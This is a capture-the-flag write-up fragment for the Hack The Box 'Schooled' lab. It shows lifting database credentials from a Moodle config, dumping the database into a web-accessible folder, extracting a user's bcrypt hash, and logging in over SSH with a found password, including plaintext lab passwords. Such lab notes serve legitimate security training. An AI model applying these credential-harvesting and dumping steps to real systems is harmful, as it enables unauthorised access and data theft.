## DB Creds
Do some poking around in the moodle directory and find a config file with some db creds
```bash
$CFG->dbtype    = 'mysqli';
$CFG->dblibrary = 'native';
$CFG->dbhost    = 'localhost';
$CFG->dbname    = 'moodle';
$CFG->dbuser    = 'moodle';
$CFG->dbpass    = 'PlaybookMaster2020';
$CFG->prefix    = 'mdl_';
```
## sqldump
- Looking in /usr/local/bin, find some usable sql binaries
- The regular *mysql* binary never returns, so just try dumping the database with mysqldump and our creds

```bash
./mysqldump -u moodle -p moodle > /usr/local/www/apache24/data/schooled.htb/mysql.out
```
- set the output to the *schooled.htb* webserver for easy access
- find some creds, the most interesting of which is the jamie user

```sql
(2,'manual',1,0,0,0,1,'admin','$2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW','','Jamie','Borham','jamie@staff.schooled.htb',0,'','','','','','','','','','','Bournemouth','GB','en','gregorian','','99',1608320129,1608729680,1608681411,1608729680,'192.168.1.14','',0,'','',1,1,0,0,1,0,0,1608389236,0,'','','','','',''),
```
- trying to decrypt, but it's a bcrypt hash so not holding my breath
- Note: we only dumped the moodle database because it's the only one we know we can see, and know exists
- the entire mysql.out is stored @ /home/hunter/htb/schooled/mysql.out
- If this doesn't work, look into some mysql oneliners for mor sql enumeration

```bash
hunter@kali ~/htb/schooled$ ssh jamie@10.10.10.234
Password for jamie@Schooled:!QAZ2wsx
Last login: Tue Mar 16 14:44:53 2021 from 10.10.14.5
FreeBSD 13.0-BETA3 (GENERIC) #0 releng/13.0-n244525-150b4388d3b: Fri Feb 19 04:04:34 UTC 2021

Welcome to FreeBSD!

Release Notes, Errata: https://www.FreeBSD.org/releases/
Security Advisories:   https://www.FreeBSD.org/security/
FreeBSD Handbook:      https://www.FreeBSD.org/handbook/
FreeBSD FAQ:           https://www.FreeBSD.org/faq/
Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/
FreeBSD Forums:        https://forums.FreeBSD.org/

Documents installed with the system are in the /usr/local/share/doc/freebsd/
directory, or can be installed later with:  pkg install en-freebsd-doc
For other languages, replace en with a language code like de or fr.

Show the version of FreeBSD installed:  freebsd-version ; uname -a
Please include that output and any error messages when posting questions.
Introduction to manual pages:  man man
FreeBSD directory layout:      man hier

To change this login announcement, see motd(5).
Before deleting a dataset or snapshot, perform a dry run using the -n
parameter. This is to make sure you really want to delete just that
dataset/snapshot and not any dependent ones. ZFS will display the resulting
action when -n is combined with the -v option without actually performing
it:

zfs destroy -nrv mypool@mysnap

Once you are sure this is exactly what you intend to do, remove the -n
parameter to execute the destroy operation.
                -- Benedict Reuschling <bcr@FreeBSD.org>
jamie@Schooled:~ $ 
```
- Well sometimes you just get lucky I guess 
- 